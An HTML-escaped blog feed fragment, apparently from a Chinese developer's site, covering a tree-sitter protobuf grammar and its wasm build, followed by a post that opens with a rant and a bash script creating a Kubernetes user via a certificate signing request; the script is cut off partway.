&lt;span class="s1">&amp;#39;&amp;lt;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">keyType&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;,&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">type&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">mapName&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;=&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fieldNumber&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">optional&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;[&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fieldOptions&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;]&amp;#39;&lt;/span>&lt;span class="p">)),&lt;/span>
&lt;span class="s1">&amp;#39;;&amp;#39;&lt;/span>
&lt;span class="p">),&lt;/span>
&lt;span class="nx">keyType&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span>
&lt;span class="nx">choice&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="s1">&amp;#39;int32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;int64&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;uint32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;uint64&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;sint32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;sint64&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;fixed32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;fixed64&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;sfixed32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;sfixed64&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;bool&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;string&amp;#39;&lt;/span>
&lt;span class="p">),&lt;/span>
&lt;span class="c1">// reserved
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">reserved&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;reserved&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">choice&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ranges&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fieldNames&lt;/span>&lt;span class="p">)),&lt;/span>
&lt;span class="nx">ranges&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">range&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">repeat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;,&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">range&lt;/span>&lt;span class="p">))),&lt;/span>
&lt;span class="nx">range&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">intLit&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">optional&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;to&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">choice&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">intLit&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;max&amp;#39;&lt;/span>&lt;span class="p">)))),&lt;/span>
&lt;span class="nx">fieldNames&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fieldName&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">repeat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;,&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fieldName&lt;/span>&lt;span class="p">))),&lt;/span>
&lt;span class="c1">// integer literals
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">intLit&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">*|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">*|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">xX&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">da&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">fA&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="c1">// floating-point literals
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">floatLit&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">choice&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sr">/\d\.\d*([eE][+-]\d*)?/&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sr">/\d*[eE][+-]\d*/&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sr">/\.\d*[eE][+-]\d*/&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;inf&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;nan&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="c1">// boolean literals
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">boolLit&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="kc">false&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="c1">// string literals
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">strLit&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span>
&lt;span class="nx">choice&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sr">/([^&amp;#34;\n\\]|\\[xX][\da-fA-F]{2}|\\[0-7]{3}|\\[abfnrtv\\&amp;#39;&amp;#34;])*/&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sr">/([^&amp;#39;\n\\]|\\[xX][\da-fA-F]{2}|\\[0-7]{3}|\\[abfnrtv\\&amp;#39;&amp;#34;])*/&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">),&lt;/span>
&lt;span class="c1">// built-in field type
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">type&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span>
&lt;span class="nx">choice&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="s1">&amp;#39;double&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;float&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;int32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;int64&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;uint32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;uint64&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;sint32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;sint64&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;fixed32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;fixed64&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;sfixed32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;sfixed64&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;bool&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;string&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;bytes&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">enumMessageType&lt;/span>
&lt;span class="p">),&lt;/span>
&lt;span class="nx">fieldNumber&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">intLit&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="c1">// empty statement
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">emptyStatement&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="c1">// constant
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">constant&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span>
&lt;span class="nx">choice&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fullIdent&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">optional&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sr">/[+-]/&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">intLit&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">optional&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sr">/[+-]/&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">floatLit&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">strLit&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">boolLit&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">msgLit&lt;/span>
&lt;span class="p">),&lt;/span>
&lt;span class="nx">msgLit&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;{&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">repeat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fieldName&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;:&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">constant&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="s1">&amp;#39;}&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="c1">// identifier
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">ident&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">zA&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">Z_&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="err">/,&lt;/span>
&lt;span class="nx">fullIdent&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ident&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">repeat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ident&lt;/span>&lt;span class="p">))),&lt;/span>
&lt;span class="nx">messageName&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ident&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">mapName&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ident&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">enumName&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ident&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">fieldName&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ident&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">oneofName&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ident&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">serviceName&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ident&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">rpcName&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ident&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">enumMessageType&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">optional&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nx">repeat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ident&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">messageName&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="编译和使用">编译和使用&lt;/h2>
&lt;p>生成的是c代码，默认是编译成机器码，和cpu指令集架构强相关。有很多语言提供了基于 C 接口的绑定。&lt;/p>
&lt;p>不过现在也支持编译成 wasm，只需要用下面的命令&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">tree-sitter build-wasm
&lt;/code>&lt;/pre>&lt;/div>&lt;p>加载方式也是用 &lt;code>Language.load&lt;/code> ，不过只有 web-tree-sitter 能加载。web-tree-sitter 可以用 &lt;code>npm i --save tree-sitter&lt;/code> 来安装。&lt;/p>
&lt;p>于是写个 main.js ，加载代码如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kr">const&lt;/span> &lt;span class="nx">Parser&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;web-tree-sitter&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">Parser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">init&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nx">then&lt;/span>&lt;span class="p">(()&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">Parser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Language&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">load&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;tree-sitter-hello.wasm&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">then&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">lang&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">parser&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">Parser&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="nx">parser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">setLanguage&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">lang&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">ast&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">parser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">parse&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;amazing tree parser&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ast&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">rootNode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">toString&lt;/span>&lt;span class="p">());&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>最终输出是&lt;/p>
&lt;pre>&lt;code>(source_file (word) (word) (word))
&lt;/code>&lt;/pre>&lt;h2 id="编辑和更新">编辑和更新&lt;/h2>
&lt;p>这个还没搞明白。&lt;/p>
&lt;p>回头参考下别的 repo 的代码，看看别人是怎么做语法树更新的。&lt;/p></description></item><item><title>csr 方式创建 kubernetes 用户出了点差错</title><link>https://nnnewb.github.io/blog/p/csr-%E6%96%B9%E5%BC%8F%E5%88%9B%E5%BB%BA-kubernetes-%E7%94%A8%E6%88%B7%E5%87%BA%E4%BA%86%E7%82%B9%E5%B7%AE%E9%94%99/</link><pubDate>Mon, 19 Jul 2021 09:52:38 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/csr-%E6%96%B9%E5%BC%8F%E5%88%9B%E5%BB%BA-kubernetes-%E7%94%A8%E6%88%B7%E5%87%BA%E4%BA%86%E7%82%B9%E5%B7%AE%E9%94%99/</guid><description>&lt;p>越是在 kubernetes 的浑水里摸索，越是发现这就是个不顺手的锤子。&lt;/p>
&lt;p>网上很多人喜欢把东西用不惯叫做懒，蠢，要是多反驳几句，那就还得搭上个“坏”的帽子。感觉吧，就这帮人看来，大神放个屁也值得学习，从里面“悟”出什么道理。&lt;/p>
&lt;p>这帮人就跟传教士一样，但凡说个不字，就是在亵渎他们的“大神”。可谓人类迷惑行为。&lt;/p>
&lt;p>好吧。技术别饭圈化行吗？&lt;/p>
&lt;p>你说尤大强吗？Richard Stallman 是不是值得尊敬？Google 是不是最好的技术公司？Android 天下无敌？&lt;/p>
&lt;p>然后全摆上神坛，挂上赛博天神的牌匾，插上网线一天 25 小时膜拜？&lt;/p>
&lt;p>这帮人哪天搞个崇拜互联网和计算机的教派，把冯·诺依曼奉为先知我都不奇怪。&lt;/p>
&lt;p>拜托，你们真的好怪欸。&lt;/p>
&lt;!-- more -->
&lt;h2 id="完整脚本">完整脚本&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="cp">#!/bin/bash -e
&lt;/span>&lt;span class="cp">&lt;/span>&lt;span class="c1">#&lt;/span>
&lt;span class="c1"># 创建用户 gitlab 并授予权限&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="c1"># reference:&lt;/span>
&lt;span class="c1"># https://kubernetes.io/zh/docs/reference/access-authn-authz/certificate-signing-requests/#normal-user&lt;/span>
&lt;span class="c1"># if `gitlab` does not exists,&lt;/span>
&lt;span class="c1"># create csr and approve&lt;/span>
&lt;span class="k">if&lt;/span> ! kubectl get csr gitlab &amp;gt;/dev/null&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="c1"># create credential&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> ! -f gitlab.csr &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
openssl genrsa -out gitlab.key &lt;span class="m">2048&lt;/span>
openssl req -new -key gitlab.key -out gitlab.csr
&lt;span class="k">fi&lt;/span>
&lt;span class="nv">csr&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$(&lt;/span>cat gitlab.csr &lt;span class="p">|&lt;/span> base64 &lt;span class="p">|&lt;/span> tr -d &lt;span class="s2">&amp;#34;\n&amp;#34;&lt;/span>&lt;span class="k">)&lt;/span>
cat &lt;span class="s">&amp;lt;&amp;lt;EOF | tee gitlab-csr.yaml
&lt;/span>&lt;span class="s">apiVersion: certificates.k8s.io/v1beta1
&lt;/span>&lt;span class="s">kind: CertificateSigningRequest
&lt;/span>&lt;span class="s">metadata:
&lt;/span>&lt;span class="s"> name: gitlab
&lt;/span>&lt;span class="s">spec:
&lt;/span>&lt;span class="s"> groups:
&lt;/span>&lt;span class="s"> - system:authenticated
&lt;/span>&lt;span class="s"> request: $csr
&lt;/span>&lt;span class="s"> signerName: kubernetes.io/kube-apiserver-client
&lt;/span>&lt;span class="s"> usages:
&lt;/span>&lt;span class="s"> - client auth
&lt;/span>&lt;span class="s">EOF&lt;/span>
kubectl create -f gitlab-csr.yaml
kubectl certificate approve gitlab
&lt;span class="k">fi&lt;/span>
&lt;span class="c1"># get signed credential&lt;/span>
kubectl get csr gitlab -o &lt;span class="nv">jsonpath&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;{.status.certificate}&amp;#39;&lt;/span>&lt;span class="p">|&lt;/span> base64 -d &amp;gt; gitlab.crt
&lt;span class="c1"># create role and rolebinding&lt;/span>
kubectl create role gitlab-ci &lt;span class="se">\
&lt;/span>&lt;span class="se">&lt;/span> --verb&lt;span class="o">=&lt;/span>create &lt;span class="se">\
&lt;/span>&lt;span class="se">&lt;/span> --verb&lt;span class="o">=&lt;/span>git &lt;span class="se">\
